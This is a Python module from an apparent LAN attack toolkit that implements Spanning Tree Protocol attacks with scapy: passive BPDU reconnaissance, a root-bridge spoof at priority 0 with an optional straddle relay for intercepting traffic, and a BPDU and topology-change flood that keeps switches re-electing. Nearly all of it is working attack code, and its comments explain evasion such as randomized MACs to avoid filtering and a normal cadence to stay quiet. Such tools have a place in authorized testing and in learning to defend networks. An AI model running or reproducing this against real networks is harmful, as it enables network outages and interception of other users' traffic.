"""STP (Spanning Tree Protocol) reconnaissance and BPDU injection jobs.

Three capabilities over one attacked segment:

* :meth:`~StpService.learn` - a bounded, blocking listen on one interface that
  collects the first configuration BPDUs it sees and reports both the current
  root bridge and the upstream switch (the neighbor on this port). Passive
  reconnaissance; nothing is sent.
* :meth:`~StpService.spoof` - a background job that periodically sends a
  configuration BPDU claiming to *be* the root bridge (bridge priority 0,
  root ID = own bridge ID, path cost 0) so a segment re-elects around us. The
  BPDU's source and bridge MAC are the interface's real MAC by design (see
  choice in ``actions.py``): losing that anonymity to guarantee a "real"
  win when we tie on priority is acceptable, and a peer at priority 0 with a
  lower MAC will still keep the root, which is the honest outcome.
* :meth:`~StpService.dos` - a background job that generates a stream of BPDUs
  with a fresh (random low priority, random locally-administered MAC) identity
  per frame, so no BPDU agrees with the previous one and switches recompute
  the tree constantly. With ``tcn=True`` the job instead emits topology-change
  notifications (BPDU type 0x80), which force MAC-table aging to drop to the
  forward delay and cause continuous unknown-unicast flooding on the segment.

Jobs are keyed by ``(interface, kind)`` where ``kind`` distinguishes ``spoof``,
``dos`` and ``dos-tcn``; only one STP job runs per interface at a time (a
second on the same interface fails with a clean error). Several interfaces may
run in parallel. :meth:`~StpService.stop_all` ends every running job at once -
there is no per-job stop by design; see the top-level ``tasks`` view for the
individual identities. Injection requires root; the CLI gates the actions. For
authorized security testing only.
"""

from __future__ import annotations

import random
import re
import threading
import time
from dataclasses import dataclass, field
from typing import TYPE_CHECKING
from scapy.layers.l2 import Dot3, LLC, STP

from mac_and_seize.core.errors import ModuleError
from mac_and_seize.net.adapters import netifaces_io, scapy_io
from mac_and_seize.observability import get_logger

if TYPE_CHECKING:
    from mac_and_seize.core.context import AppContext

#: IEEE 802.1D BPDU multicast destination. Every 802.1D-compliant switch
#: listens on this address and does not forward frames to it, so a BPDU stays
#: on the segment it was injected on.
_BPDU_MULTICAST = "01:80:c2:00:00:00"

#: BPF filter used by :meth:`~StpService.learn`. Restricts the receive path to
#: BPDU frames so the sniffer doesn't hand every packet on a busy segment up
#: through Python for a look at its EtherType.
_BPF_BPDU = f"ether dst {_BPDU_MULTICAST}"

#: BPDU type codes (802.1D-2004 §14.4). Configuration BPDUs (0x00) carry the
#: tree topology; topology-change notifications (0x80) are a bare header
#: telling the root that something changed.
_BPDU_CONFIG = 0x00
_BPDU_TCN = 0x80

#: How often :meth:`spoof` sends a configuration BPDU. Matches the default
#: hello time of 2s so we look like a real (well-behaved) root bridge from
#: the wire's point of view - sending faster would work too, but a normal
#: cadence makes the redirection quieter.
_HELLO_S = 2.0
#: Cadence for :meth:`dos` in configuration mode. Fast enough that no
#: election ever converges (a switch typically needs several hello periods to
#: stabilise), while still leaving room in the loop for the stop event to be
#: checked between frames.
_DOS_CONFIG_INTERVAL_S = 0.1

#: Cadence for :meth:`dos` in TCN mode. TCN handling is more expensive per
#: BPDU than a plain reconfiguration (each TCN starts a topology change that
#: shortens the MAC-aging timer segment-wide), so the flood can be slower and
#: still keep the segment continuously churning.
_DOS_TCN_INTERVAL_S = 0.5

#: Default :meth:`learn` window. Long enough to observe several hellos on a
#: healthy segment (the default hello time is 2s) and to catch a slower or
#: extended-system-ID variant; short enough that the prompt does not feel
#: hung.
_LEARN_TIMEOUT_S = 8.0

#: How many consecutive failed sends end a job on its own (e.g. the interface
#: went down mid-run) instead of spinning forever logging.
_MAX_CONSECUTIVE_FAILURES = 20

#: MAC address format (six colon-separated hex bytes).
_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")

#: Bridge priority we claim when spoofing. 0 is the lowest (and therefore
#: "best") priority a bridge can advertise, so we win the election against
#: any peer running at a default (32768) or manually configured non-zero
#: priority. Peers also at 0 win/lose on lower MAC, exactly as 802.1D
#: specifies - see the module docstring.
_SPOOF_PRIORITY = 0

#: STP protocol/version identifiers (802.1D-2004). ``version=0`` is the
#: original STP; ``version=2`` is RSTP. Real switches accept plain STP
#: BPDUs on RSTP links (falling back to STP semantics), so emitting v0
#: keeps the frame acceptable everywhere without having to build RST BPDUs.
_STP_PROTOCOL_ID = 0
_STP_VERSION = 0

#: Bridge-ID priority field is a 16-bit value combining a 4-bit priority
#: (multiples of 4096) and a 12-bit system-ID extension used by MST/PVST+.
#: For the DoS we vary only the 4-bit priority (0..15 * 4096) so every
#: forged bridge sits below the default 32768 and provokes an election.
_DOS_MAX_PRIORITY = 15 * 4096


def _random_local_mac() -> str:
    """Return a random locally-administered unicast MAC.

    Bit 1 of the first octet is the locally-administered flag (LAA); bit 0 is
    the multicast flag. Setting bit 1 and clearing bit 0 (=``0x02``) gives an
    address that a switch will happily learn (it is unicast) without colliding
    with an OUI-registered vendor space.
    """
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )
def _bpdu_frame(
    *,
    src_mac: str,
    bpdu_type: int,
    root_priority: int = 0,
    root_mac: str = "00:00:00:00:00:00",
    path_cost: int = 0,
    bridge_priority: int = 0,
    bridge_mac: str = "00:00:00:00:00:00",
    port_id: int = 0x8001,
    age: float = 0.0,
    max_age: float = 20.0,
    hello_time: float = 2.0,
    forward_delay: float = 15.0,
    flags: int = 0x00,
) -> bytes:
    """Build one BPDU wrapped in 802.3 + LLC (SAP 0x42, control 0x03).

    A BPDU is an 802.3 frame (not Ethernet II): the ``length`` field takes the
    place of the EtherType and LLC identifies the payload. Scapy computes the
    length itself from the payload once the frame is built.
    """
    frame = (
        Dot3(dst=_BPDU_MULTICAST, src=src_mac)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        / STP(
            proto=_STP_PROTOCOL_ID,
            version=_STP_VERSION,
            bpdutype=bpdu_type,
            bpduflags=flags,
            rootid=root_priority,
            rootmac=root_mac,
            pathcost=path_cost,
            bridgeid=bridge_priority,
            bridgemac=bridge_mac,
            portid=port_id,
            age=age,
            maxage=max_age,
            hellotime=hello_time,
            fwddelay=forward_delay,
        )
    )
    return bytes(frame)


def _validate_iface(iface: str) -> str:
    text = (iface or "").strip()
    if not text:
        raise ValueError("Give an interface to operate on.")
    available = scapy_io.available_interfaces()
    if text not in available:
        raise ValueError(
            f"Unknown interface {text!r}. "
            f"Available: {', '.join(available) or 'none'}."
        )
    return text


def _read_iface_mac(iface: str) -> str:
    """Return the interface's own MAC address (lower-case, colon form)."""
    _ipv4, _ipv6, mac = netifaces_io.read_addresses(iface)
    hardware = next((item for item in (mac.get("addr") or []) if item), None)
    if not hardware or not _MAC_RE.match(str(hardware)):
        raise ModuleError(
            f"Could not read the MAC address of {iface!r}; is the interface up?"
        )
    return str(hardware).lower()


def _parse_bpdu(packet) -> dict | None:
    """Extract fields from an incoming BPDU, or return ``None`` if not one.

    Only Dot3+LLC-framed STP BPDUs are considered; anything else the sniffer
    happens to catch (a same-address non-STP frame) is filtered out here.
    """
    if not packet.haslayer(STP):
        return None
    stp = packet[STP]
    return {
        "kind": "tcn" if int(stp.bpdutype) == _BPDU_TCN else "config",
        "version": int(stp.version),
        "flags": int(stp.bpduflags),
        "root_priority": int(stp.rootid),
        "root_mac": str(stp.rootmac).lower(),
        "path_cost": int(stp.pathcost),
        "bridge_priority": int(stp.bridgeid),
        "bridge_mac": str(stp.bridgemac).lower(),
        "port_id": int(stp.portid),
        "age": float(stp.age),
        "max_age": float(stp.maxage),
        "hello_time": float(stp.hellotime),
        "forward_delay": float(stp.fwddelay),
    }


@dataclass
class _StpJob:
    """One running STP job (one interface + one kind: spoof, dos, or dos-tcn)."""

    iface: str
    #: One of ``"spoof"``, ``"dos"``, ``"dos-tcn"``. Names the job for the
    #: ``tasks`` view and the ``stop`` summary; the worker branches on it.
    kind: str
    #: Bridge MAC the job identifies itself as (spoof-only; the DoS worker
    #: rolls a fresh one per frame).
    src_mac: str
    stop_event: threading.Event = field(default_factory=threading.Event)
    started_at: float = 0.0
    thread: threading.Thread | None = None
    task: object | None = None
    sent: int = 0
    #: When ``lan stp spoof --relay <egress>`` is used, the relay handle for
    #: the straddle-bridge flow the RelayService set up for this job.
    #: Torn down in :meth:`_finalize` alongside the poison thread.
    relay_handle: object | None = None

    @property
    def key(self) -> str:
        return self.iface


class StpService:
    """Session-scoped registry of STP jobs (one job per interface)."""

    def __init__(self) -> None:
        self._log = get_logger(__name__)
        self._lock = threading.RLock()
        self._jobs: dict[str, _StpJob] = {}
        self._context: "AppContext | None" = None

    # --- Public API -----------------------------------------------------------

    def learn(
        self,
        context: "AppContext",
        interface: str,
        *,
        timeout: float | None = None,
    ) -> dict:
        """Listen for BPDUs on ``interface`` for ``timeout`` seconds; report.

        Blocks - it is a short, bounded probe and the result is only meaningful
        once the window closes (several BPDUs may arrive; keeping the freshest
        of each kind avoids reporting a stale root that the segment has since
        re-elected). Returns a dict describing the root bridge, the upstream
        switch this port is attached to, and the timers advertised. Raises
        :class:`ModuleError` if no BPDUs were seen within the window.
        """
        iface = _validate_iface(interface)
        wait = _LEARN_TIMEOUT_S if timeout is None else float(timeout)
        if wait <= 0:
            raise ValueError("--timeout must be a positive number of seconds.")

        latest_config: dict | None = None
        tcn_count = 0
        config_count = 0
        seen_lock = threading.Lock()
        def collect(packet) -> None:
            nonlocal latest_config, tcn_count, config_count
            info = _parse_bpdu(packet)
            if info is None:
                return
            with seen_lock:
                if info["kind"] == "tcn":
                    tcn_count += 1
                else:
                    config_count += 1
                    # Keep the freshest config BPDU: on a segment that just
                    # re-elected, the earlier one describes a tree that no
                    # longer exists.
                    latest_config = info

        scapy_io.refresh_interfaces()
        try:
            sniffer = scapy_io.dispatch_sniffer(
                iface, collect, bpf_filter=_BPF_BPDU,
            )
            sniffer.start()
        except OSError as exc:
            raise ModuleError(
                f"Could not listen for BPDUs on {iface!r}: {exc}"
            ) from exc

        try:
            time.sleep(wait)
        finally:
            self._stop_sniffer(sniffer)

        with seen_lock:
            config = latest_config
            tcn_seen = tcn_count
            config_seen = config_count

        if config is None and tcn_seen == 0:
            raise ModuleError(
                f"No STP BPDUs seen on {iface} within {wait:g}s. STP may be "
                "disabled on this port, or the segment may be filtering BPDUs."
            )
        if config is None:
            raise ModuleError(
                f"Only topology-change notifications seen on {iface} "
                f"({tcn_seen} TCN(s) in {wait:g}s); no configuration BPDU to "
                "identify the root or the upstream switch. The segment is "
                "actively re-electing - try again once it settles."
            )
        topology_change = bool(config["flags"] & 0x01)
        topology_change_ack = bool(config["flags"] & 0x80)
        is_direct = config["root_mac"] == config["bridge_mac"]
        variant = "RSTP" if config["version"] == 2 else "STP"
        return {
            "interface": iface,
            "protocol": variant,
            "root priority": config["root_priority"],
            "root MAC": config["root_mac"],
            "root path cost": config["path_cost"],
            "upstream bridge priority": config["bridge_priority"],
            "upstream bridge MAC": config["bridge_mac"],
            "upstream port id": f"0x{config['port_id']:04x}",
            "hello time (s)": config["hello_time"],
            "max age (s)": config["max_age"],
            "forward delay (s)": config["forward_delay"],
            "message age (s)": config["age"],
            "upstream is root": "yes" if is_direct else "no",
            "topology change flag": "yes" if topology_change else "no",
            "topology change ack": "yes" if topology_change_ack else "no",
            "config BPDUs observed": config_seen,
            "TCN BPDUs observed": tcn_seen,
        }

    def spoof(
        self,
        context: "AppContext",
        interface: str,
        *,
        relay_egress: str | None = None,
    ) -> str:
        """Start a background STP root-bridge spoof on ``interface``.

        Claims the interface's own MAC at bridge priority 0 as the segment's
        root; a switch running with a default priority (32768) or any
        non-zero configured priority will re-elect around us within a few
        hello intervals. Returns immediately; the prompt stays usable. Stop
        every running STP job with ``lan stp stop``.

        When ``relay_egress`` is given, a straddle relay is started that
        bridges frames verbatim between ``interface`` and ``relay_egress``
        - the traffic pattern the spoofed root sees on the wire once the
        segment recomputes. The relay is a Python bridge and is not suitable
        for high-throughput segments; for physically in-line taps use a
        kernel bridge outside this tool.
        """
        iface = _validate_iface(interface)
        src_mac = _read_iface_mac(iface)
        if relay_egress is not None:
            egress = _validate_iface(relay_egress)
            if egress == iface:
                raise ValueError(
                    "--relay must name a *different* interface from the one "
                    "the spoof runs on (straddle needs two NICs)."
                )
        else:
            egress = None
        job = _StpJob(
            iface=iface,
            kind="spoof",
            src_mac=src_mac,
            started_at=time.monotonic(),
        )
        # Start the relay *before* the spoof so a failed relay setup doesn't
        # leave a running poison job behind. Handled all-or-nothing.
        if egress is not None:
            try:
                job.relay_handle = context.service("relay").begin_straddle(
                    context, iface_a=iface, iface_b=egress,
                )
            except KeyError as exc:
                raise ModuleError(
                    "The 'relay' module is not loaded; cannot start "
                    "--relay for lan stp spoof."
                ) from exc
        try:
            summary = self._start(
                context,
                job,
                summary=(
                    f"STP root-bridge spoof started on {iface} as {src_mac} at "
                    f"priority {_SPOOF_PRIORITY} (sending a configuration BPDU "
                    f"every {_HELLO_S:g}s)."
                    + (
                        f" Straddle relay bridging {iface} <-> {egress} is "
                        "running alongside (Python bridge - low throughput)."
                        if egress is not None
                        else ""
                    )
                    + " Stop every running STP job with 'lan stp stop'."
                ),
            )
        except Exception:
            if job.relay_handle is not None:
                try:
                    context.service("relay").end(job.relay_handle)
                except Exception:  # noqa: BLE001
                    self._log.debug("Relay rollback failed", exc_info=True)
            raise
        return summary

    def dos(
        self,
        context: "AppContext",
        interface: str,
        *,
        tcn: bool = False,
    ) -> str:
        """Start a background BPDU-flood on ``interface``.

        Without ``tcn`` every emitted frame is a configuration BPDU with a
        fresh random (low priority, locally-administered MAC) identity, so no
        two frames agree on a root and the tree never converges. With ``tcn``
        the job emits topology-change notifications only, forcing the segment
        to run its post-change short MAC-aging timer continuously.
        """
        iface = _validate_iface(interface)
        # For dos we do not need the interface's real MAC (each frame is
        # randomized), but we still record one for the job label so the
        # 'tasks' view has something to show; the worker regenerates as needed.
        placeholder_mac = _random_local_mac()
        job = _StpJob(
            iface=iface,
            kind="dos-tcn" if tcn else "dos",
            src_mac=placeholder_mac,
            started_at=time.monotonic(),
        )
        if tcn:
            summary = (
                f"STP TCN flood started on {iface} (sending a topology-change "
                f"notification every {_DOS_TCN_INTERVAL_S:g}s). "
                "Stop every running STP job with 'lan stp stop'."
            )
        else:
            summary = (
                f"STP re-election flood started on {iface} (randomized "
                f"configuration BPDU every {_DOS_CONFIG_INTERVAL_S:g}s). "
                "Stop every running STP job with 'lan stp stop'."
            )
        return self._start(context, job, summary=summary)

    def stop_all(self) -> str:
        """Stop every running STP job (raises if none are running)."""
        with self._lock:
            self._reap_locked()
            jobs = list(self._jobs.values())
        if not jobs:
            raise ModuleError("No STP jobs are running.")
        for job in jobs:  # signal them all first so they wind down together
            job.stop_event.set()
        total = 0
        for job in jobs:
            self._join_job(job)
            total += job.sent
        labels = ", ".join(f"{job.kind}@{job.iface}" for job in jobs)
        return (
            f"Stopped {len(jobs)} STP job(s): {labels} "
            f"({total} BPDU(s) sent total)."
        )

    # --- Job start / worker ---------------------------------------------------

    def _start(
        self, context: "AppContext", job: _StpJob, *, summary: str,
    ) -> str:
        """Register ``job`` in the task manager and spawn its worker thread."""
        with self._lock:
            self._reap_locked()
            if job.iface in self._jobs:
                existing = self._jobs[job.iface]
                raise ModuleError(
                    f"An STP job is already running on {job.iface!r} "
                    f"({existing.kind}); stop it first with 'lan stp stop'."
                )
            self._context = context
            job.thread = threading.Thread(
                target=self._run,
                args=(job,),
                name=f"lan-stp-{job.kind}-{job.iface}",
                daemon=True,
            )
            job.task = context.tasks.start(
                context.current_command,
                stop=lambda k=job.iface: self._stop_key(k),
            )
            self._jobs[job.iface] = job
            job.thread.start()
        return summary
    def _run(self, job: _StpJob) -> None:
        """Injection loop for one job; always finalizes on exit."""
        if job.kind == "spoof":
            interval = _HELLO_S
            frame_source = self._spoof_frame_source(job)
        elif job.kind == "dos-tcn":
            interval = _DOS_TCN_INTERVAL_S
            frame_source = self._tcn_frame_source()
        else:  # "dos" (configuration-BPDU flood)
            interval = _DOS_CONFIG_INTERVAL_S
            frame_source = self._dos_config_frame_source()

        failures = 0
        error = False
        try:
            while not job.stop_event.is_set():
                frame = frame_source()
                try:
                    scapy_io.send_l2(frame, job.iface)
                    job.sent += 1
                    failures = 0
                except OSError as exc:
                    # Injection can fail transiently (device busy) or hard
                    # (the interface vanished). Debug, not warning - the loop
                    # runs periodically and must not flood the prompt.
                    failures += 1
                    self._log.debug(
                        "STP %s: send on %s failed: %s",
                        job.kind, job.iface, exc,
                    )
                    if failures >= _MAX_CONSECUTIVE_FAILURES:
                        self._log.warning(
                            "STP %s on %s gave up: %d consecutive send "
                            "failures.",
                            job.kind, job.iface, failures,
                        )
                        error = True
                        break
                job.stop_event.wait(interval)
        except Exception:  # noqa: BLE001 - a crashed worker must still finalize
            self._log.exception(
                "STP %s worker for %s crashed", job.kind, job.iface,
            )
            error = True
        finally:
            self._finalize(job, error=error)

    # Frame-source closures: each returns a callable that builds one frame,
    # letting the worker loop stay identical across the three job kinds.
    def _spoof_frame_source(self, job: _StpJob):
        src_mac = job.src_mac
        def make() -> bytes:
            return _bpdu_frame(
                src_mac=src_mac,
                bpdu_type=_BPDU_CONFIG,
                root_priority=_SPOOF_PRIORITY,
                root_mac=src_mac,
                path_cost=0,
                bridge_priority=_SPOOF_PRIORITY,
                bridge_mac=src_mac,
            )
        return make

    def _dos_config_frame_source(self):
        def make() -> bytes:
            mac = _random_local_mac()
            # Random 4-bit priority (0..15) times 4096 = one of the 16 legal
            # 802.1D priority values; the 12-bit system-ID extension stays 0.
            priority = random.randint(0, 15) * 4096
            return _bpdu_frame(
                src_mac=mac,
                bpdu_type=_BPDU_CONFIG,
                root_priority=priority,
                root_mac=mac,
                path_cost=0,
                bridge_priority=priority,
                bridge_mac=mac,
            )
        return make
    def _tcn_frame_source(self):
        def make() -> bytes:
            # TCNs carry no topology info - only their type matters - so the
            # source MAC is the one degree of freedom left. Randomizing it
            # keeps the flood from being trivially filterable by source.
            return _bpdu_frame(
                src_mac=_random_local_mac(),
                bpdu_type=_BPDU_TCN,
            )
        return make
    # --- Lifecycle ------------------------------------------------------------

    def _finalize(self, job: _StpJob, *, error: bool) -> None:
        """Drop ``job`` from the registry and report a self-end via notify."""
        with self._lock:
            if self._jobs.get(job.iface) is job:
                del self._jobs[job.iface]

        context = self._context
        if job.task is not None and context is not None:
            context.tasks.finish(job.task)

        # Tear down the coupled relay handle (see spoof(...)) alongside the
        # poison thread; the relay outlives no useful state once the job
        # stops re-electing us as root. Idempotent: RelayService.end() drops
        # unknown handles silently.
        if job.relay_handle is not None and context is not None:
            try:
                context.service("relay").end(job.relay_handle)
            except Exception:  # noqa: BLE001 - teardown must not raise at the prompt
                self._log.debug(
                    "STP: relay teardown failed", exc_info=True,
                )
            job.relay_handle = None

        # A user-driven stop (stop_event set by stop_all()) is reported by
        # that command; stay quiet to avoid a duplicate line. A job that
        # ended on its own (repeated send failures / crash) happened while
        # the user is elsewhere, so surface it via the prompt-safe notify
        # channel.
        if job.stop_event.is_set() or context is None:
            return
        if error:
            context.presenter.notify(
                f"STP {job.kind} on {job.iface} stopped: injection kept "
                f"failing ({job.sent} BPDU(s) sent)."
            )

    def _stop_sniffer(self, sniffer) -> None:
        """Stop a sniffer, tolerating one that never fully started."""
        try:
            if getattr(sniffer, "running", False):
                sniffer.stop()
        except Exception:  # noqa: BLE001 - teardown must not raise at the prompt
            self._log.debug("STP: sniffer stop failed", exc_info=True)

    def _stop_key(self, iface: str) -> None:
        """Stop the job on ``iface`` (used as a task-registry stop hook)."""
        with self._lock:
            self._reap_locked()
            job = self._jobs.get(iface)
        if job is None:
            return
        self._join_job(job)

    def _reap_locked(self) -> None:
        """Drop jobs whose worker already exited (defensive: workers self-remove)."""
        dead = [
            iface
            for iface, job in self._jobs.items()
            if job.thread is not None and not job.thread.is_alive()
        ]
        for iface in dead:
            self._jobs.pop(iface, None)

    def _join_job(self, job: _StpJob) -> None:
        """Signal ``job`` and wait for its worker (which finalizes) to finish."""
        job.stop_event.set()
        thread = job.thread
        if (
            thread is not None
            and thread.is_alive()
            and thread is not threading.current_thread()
        ):
            thread.join(timeout=3.0)
